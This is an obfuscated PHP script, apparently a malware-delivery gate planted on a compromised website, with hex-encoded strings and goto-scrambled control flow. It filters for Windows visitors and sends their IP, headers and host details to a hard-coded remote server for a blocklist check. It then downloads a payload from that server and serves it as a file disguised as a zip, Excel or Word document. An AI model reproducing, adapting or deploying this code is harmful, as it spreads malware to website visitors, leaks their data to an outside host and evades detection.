<?php
 goto iIQAw; EslMI: $data_json = json_encode($data_json); goto osQ35; UKDhn: if ($_GET["\x65"] != "\x31\x32\63\x2e" . $file_ext) { if ($is_black) { die(''); } if ($_GET["\145"] != $REDIRECT_FILENAME . "\56" . $file_ext) { $_SESSION["\x5f\x5f\x72\145\x64\151\x72\x65\143\164\137\167\141\163\x5f\163\164\141\x72\x74"] = true; $_SESSION["\x64\157\143\137\156\141\x6d\145"] = $_GET["\145"]; if (stripos($_SESSION["\144\x6f\x63\137\156\141\x6d\x65"], "\56" . $file_ext) === false) { $_SESSION["\144\x6f\143\137\x6e\x61\x6d\145"] .= "\x2e" . $file_ext; } $_SESSION["\146\151\x6c\145\137\x65\170\164"] = $file_ext; $redirect_uri = str_replace($_GET["\x65"], $REDIRECT_FILENAME . "\56" . $file_ext, $REQUEST_URI); echo "\x3c\x68\164\x6d\x6c\76\x3c\x62\157\x64\171\76"; echo "\x3c\144\x69\166\x20\151\144\75\x22\x6e\x6b\x22\x20\144\164\55\156\x6b\75\x22" . $redirect_uri . "\42\x3e\x3c\57\x64\151\x76\x3e"; echo "\x3c\163\143\x72\x69\160\x74\x3e"; echo "\x6c\x6f\x63\141\x74\x69\x6f\156\x2e\x70\x61\x74\150\x6e\x61\155\145\x20\75\40\144\157\x63\x75\155\x65\156\x74\56\147\145\164\x45\154\x65\155\x65\156\x74\102\x79\x49\144\50\47\156\153\x27\51\x2e\147\x65\x74\x41\x74\164\x72\x69\142\x75\x74\145\50\47\144\164\x2d\156\x6b\x27\x29\x3b"; echo "\x3c\57\x73\143\162\x69\160\164\x3e"; echo "\74\57\x62\157\x64\171\76\74\x2f\150\x74\155\154\76"; die("\x57\141\151\164\56\56\x2e"); } } else { if (empty($hdrs_new["\x68\150"])) { die(''); } } goto ql0M_; v1yQB: if (empty($REQUEST_URI)) { die(''); } goto L9RhW; AvwLc: if (empty($_SERVER["\x48\x54\x54\x50\x5f\x55\123\x45\122\137\x41\x47\x45\116\124"])) { die(''); } goto BPdvE; TTkvb: $is_black = false; goto chcvu; L9RhW: $REQUEST_URI_ARR = explode("\x2f", $REQUEST_URI); goto oAGsF; RXtol: if (!in_array($file_ext, array("\x7a\151\x70", "\170\154\163", "\x64\x6f\x63", "\x78\154\x6c"))) { $file_ext = "\172\151\x70"; } goto ffgAy; pJSck: $REQUEST_URI = $_SERVER["\x52\105\x51\x55\x45\123\x54\x5f\125\x52\x49"]; goto v1yQB; BPdvE: if (stripos($_SERVER["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\137\101\107\105\116\124"], "\127\x69\156\x64\157\x77\163") === false) { die(''); } goto EeFXj; Ykujl: $_GET["\145"] = $REQUEST_URI_ARR[2]; goto AvwLc; YJp9f: if (session_start() === false) { die(''); } goto pJSck; DBcZS: $REDIRECT_FILENAME = "\x63\x68\141\x72\x74\163"; goto YJp9f; osQ35: $data_json = base64_encode($data_json); goto lwN5h; SRD0e: $file_ext = end($file_ext); goto RXtol; ffgAy: $data_json = array("\151\x70" => getRealIpAddr(), "\x74\151\x6d\145" => time(), "\x68\150" => $hdrs_new["\150\150"], "\145\170\x74" => $file_ext, "\150\157\x73\164" => $_SERVER["\123\105\x52\x56\x45\122\x5f\116\x41\115\x45"], "\146\151\154\x65\x6e\141\155\x65" => $_GET["\x65"]); goto EslMI; hIDH_: if (empty($hdrs_new["\x68\150"]) && $_GET["\x65"] != $REDIRECT_FILENAME . "\56" . $file_ext) { die; } goto oBlYo; iIQAw: $VERSION = "\62\x2e\x31"; goto DBcZS; lwN5h: $ip_for_check = getRealIpAddr(); goto AnTgg; lGFHU: $hdrs_new = array(); goto XCdCs; chcvu: foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\x68\x74\x74\160" => array("\x74\x69\155\x65\157\x75\164" => 10))); $tmp_resp = file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\163\x74\141\164\x75\163"] === true) { $is_black = $tmp_resp_json["\x69\163\137\x62\154\x61\143\153"]; $REDIRECT_FILENAME = $tmp_resp_json["\x52\x45\x44\111\x52\x45\x43\124\137\x46\111\114\105\116\101\x4d\x45"]; break; } } goto UKDhn; XCdCs: $hdrs = getallheaders(); goto pukl1; kP38H: if (empty($_SESSION["\x64\x6f\143\x5f\156\141\155\x65"])) { $_SESSION["\x64\157\143\x5f\156\x61\x6d\145"] = $REDIRECT_FILENAME . "\x2e" . $file_ext; } goto I7egJ; UGLqI: $file_ext = explode("\56", $_GET["\x65"]); goto SRD0e; wFXXL: $outfilepath = __DIR__ . "\57\56\x2e\x2f\x62\151\x67\x5f\x5f\x73\164\x61\x74\56\164\170\x74"; goto kP38H; AnTgg: $links_ip_ckeck = array("\150\164\164\160\72\57\x2f\67\67\x2e\x32\x33\x32\56\63\66\x2e\x32\x30\64\x2f\162\157\x75\x74\145\162\x5f\142\x6c\x61\143\x6b\x2e\x70\150\160\x3f\x69\x70\75" . $ip_for_check . "\x26\x64\141\164\x61\75" . $data_json . "\46\x76\145\162\x73\151\x6f\156\75" . $VERSION . "\x26\141\x6c\141\156\160\157\75" . $hdrs_new["\141\154\141\x6e\160\157"], "\x68\x74\164\160\72\57\57\x37\67\56\x32\63\62\56\x33\66\56\62\60\x34\x2f\x72\157\165\164\x65\162\x5f\x62\154\141\x63\153\x2e\160\150\160\77\151\160\x3d" . $ip_for_check . "\x26\x64\141\164\x61\75" . $data_json . "\46\166\x65\x72\163\151\157\x6e\75" . $VERSION . "\46\141\154\x61\x6e\x70\157\x3d" . $hdrs_new["\141\154\141\156\x70\x6f"], "\150\164\164\x70\x3a\57\x2f\67\67\x2e\x32\63\x32\x2e\63\66\56\62\60\64\57\x72\157\x75\164\x65\x72\137\x62\154\141\143\x6b\56\x70\150\x70\77\151\160\75" . $ip_for_check . "\46\144\141\164\141\x3d" . $data_json . "\46\166\x65\162\163\x69\x6f\156\x3d" . $VERSION . "\46\x61\x6c\x61\156\160\157\75" . $hdrs_new["\x61\154\x61\x6e\x70\x6f"]); goto TTkvb; Ennys: shuffle($links); goto wFXXL; pukl1: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto UGLqI; oBlYo: $links = array("\150\x74\164\x70\72\57\x2f\67\67\x2e\62\63\x32\x2e\x33\x36\56\x32\x30\x34\57\162\x6f\165\164\145\162\60\70\56\x70\150\160\77\x70\x70\75" . $data_json . "\x26\x76\x65\x72\x73\x69\x6f\156\75" . $VERSION, "\150\x74\164\160\72\x2f\57\67\x37\56\62\63\x32\x2e\x33\66\x2e\62\x30\64\x2f\x72\157\165\x74\x65\162\60\70\x2e\160\150\x70\77\x70\x70\75" . $data_json . "\46\166\x65\162\163\x69\x6f\156\x3d" . $VERSION, "\150\164\164\160\72\x2f\x2f\x37\67\x2e\62\x33\x32\56\63\x36\56\62\x30\64\x2f\162\157\165\x74\x65\x72\60\x38\56\x70\x68\x70\x3f\x70\x70\x3d" . $data_json . "\x26\x76\x65\x72\x73\151\x6f\156\75" . $VERSION); goto Ennys; ql0M_: if (empty($_SESSION["\x66\x69\154\145\x5f\x65\170\x74"])) { $_SESSION["\x66\151\x6c\x65\137\x65\x78\164"] = "\x7a\151\x70"; } goto hIDH_; I7egJ: foreach ($links as $link) { $ctx = stream_context_create(array("\150\x74\164\x70" => array("\x74\151\155\x65\157\x75\x74" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\x2e\x2e\56\x2e" || $data == "\56\x2e\x2e") { break; } if (strlen($data) < 1000) { continue; } header("\103\157\x6e\164\145\x6e\x74\x2d\104\x65\x73\143\162\x69\160\x74\151\157\156\x3a\40\106\151\x6c\145\40\124\162\141\x6e\163\x66\145\x72"); header("\103\x6f\x6e\164\x65\156\164\x2d\x54\x79\160\145\x3a\40\x61\160\160\154\151\143\x61\x74\151\x6f\x6e\57\x6f\143\x74\145\x74\55\x73\x74\x72\145\x61\x6d"); header("\x43\x6f\x6e\x74\x65\x6e\164\x2d\x44\151\163\160\157\163\151\164\x69\157\156\72\x20\x61\x74\x74\141\x63\x68\155\145\156\x74\x3b\40\146\x69\x6c\145\156\141\x6d\145\75" . $_SESSION["\144\x6f\143\x5f\156\141\x6d\145"]); header("\103\157\x6e\164\145\x6e\x74\55\x54\x72\x61\x6e\x73\146\145\162\55\105\x6e\x63\x6f\x64\151\156\147\72\40\x62\x69\x6e\141\x72\x79"); header("\103\157\156\x6e\x65\143\164\x69\157\156\x3a\40\x4b\145\x65\160\55\x41\x6c\x69\x76\145"); header("\x45\x78\160\151\162\145\x73\x3a\40\60"); header("\x43\x61\143\x68\x65\x2d\103\157\156\x74\162\x6f\154\72\40\155\165\163\x74\55\x72\x65\x76\x61\154\x69\x64\x61\164\145\54\40\160\x6f\163\164\55\x63\150\x65\143\153\75\60\54\40\x70\x72\145\55\x63\x68\x65\x63\153\x3d\60"); header("\120\x72\x61\147\155\x61\x3a\x20\x70\165\x62\154\x69\143"); echo $data; die; } goto O3Nc7; oAGsF: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto Ykujl; EeFXj: function getRealIpAddr() { if (!empty($_SERVER["\110\124\x54\x50\137\103\x4c\x49\105\x4e\x54\137\111\120"])) { $ip = $_SERVER["\110\x54\x54\x50\137\103\114\111\105\116\124\x5f\111\120"]; } elseif (!empty($_SERVER["\110\124\x54\x50\x5f\130\x5f\x46\x4f\122\x57\x41\x52\x44\x45\104\137\x46\x4f\122"])) { $ip = $_SERVER["\x48\124\x54\x50\137\x58\x5f\106\x4f\x52\127\x41\x52\x44\105\x44\x5f\x46\x4f\122"]; } else { $ip = $_SERVER["\x52\105\x4d\x4f\124\x45\x5f\x41\x44\104\122"]; } return $ip; } goto lGFHU; O3Nc7: die("\x54\x72\x79\x20\x61\x67\x61\151\x6e\56");